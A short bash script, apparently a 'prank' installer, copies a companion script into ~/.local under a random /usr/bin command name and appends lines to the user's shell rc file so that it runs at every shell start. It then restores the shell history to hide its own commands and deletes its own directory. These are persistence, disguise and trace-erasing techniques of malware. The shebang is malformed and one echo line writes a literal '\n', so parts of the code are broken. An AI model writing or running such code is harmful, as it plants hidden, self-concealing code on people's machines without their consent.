!#/bin/bash

SHELL=$(basename $SHELL)
HISTORY_PATH="$HOME/.${SHELL}_history"
CONFIG_PATH="$HOME/.${SHELL}rc"
HISTORY_CONTENT=$(cat $HISTORY_PATH)

mkdir -p $HOME/.local

FROM_PATH="$(dirname $0)/prank-me.sh"
TARGET_NAME=$(ls /usr/bin | sort -R | head -n 1)
TARGET_PATH="$HOME/.local/$TARGET_NAME"

cp $FROM_PATH $TARGET_PATH

echo "export PATH=\$PATH:$HOME/.local\n$TARGET_PATH" >> $CONFIG_PATH
echo "$TARGET_PATH" >> $CONFIG_PATH
source $CONFIG_PATH

echo $HISTORY_CONTENT > $HISTORY_PATH
rm -rf $(dirname $0)
